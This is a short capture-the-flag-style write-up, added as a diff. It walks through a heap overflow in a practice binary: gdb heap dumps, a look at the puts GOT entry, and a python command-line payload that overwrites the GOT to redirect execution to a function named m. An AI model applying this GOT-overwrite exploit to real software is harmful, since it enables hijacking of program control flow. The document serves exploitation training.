@@ -1,0 +1,46 @@
+There is 2 strcpy beside, we can overflow the first one to overwrite the second parameters since they are mallocated ->
+
+
+place 1 breakpoints after the two malloc
+
+
+info proc mappings
+
+x/20wx 0x804a000 [heap]
+
+0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
+0x804a010:	0x00000000	0x00000011	0x00000000	0x00000000
+0x804a020:	0x00000000	0x00000011	0x00000002	0x00000000
+0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
+
+basicly there is our mallocated area + metadata
+
+if we overwrite first parameters it will become ---> 
+
+0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
+0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
+0x804a020:	0x41414141	0x41414141	0x41414141	0x08049928 <-- second parameters and we can change its address
+0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
+
+0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+(gdb) disas 0x8048400
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
+   0x08048406 <+6>:	push   0x28
+   0x0804840b <+11>:	jmp    0x80483a0
+
+0x8049928 <puts@got.plt>:	0x06
+
+puts call to GOT (global offset table)
+
+We will write to this addr to change it for m function ->
+
+(gdb) p &m
+						
+run $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+										^										^
+										|										|
+							 write at this addr                               m addr          	
+
+it sucessfully call m and print our buffer which is set with fgets
